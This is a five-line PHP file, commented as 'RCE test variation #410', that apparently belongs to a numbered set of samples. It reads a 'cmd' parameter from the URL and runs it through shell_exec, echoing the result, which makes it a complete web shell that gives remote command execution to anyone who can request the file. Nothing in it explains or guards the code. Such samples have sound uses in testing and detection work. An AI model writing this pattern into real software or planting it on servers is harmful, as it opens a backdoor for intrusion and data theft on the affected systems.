<?php
// RCE test variation #410
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>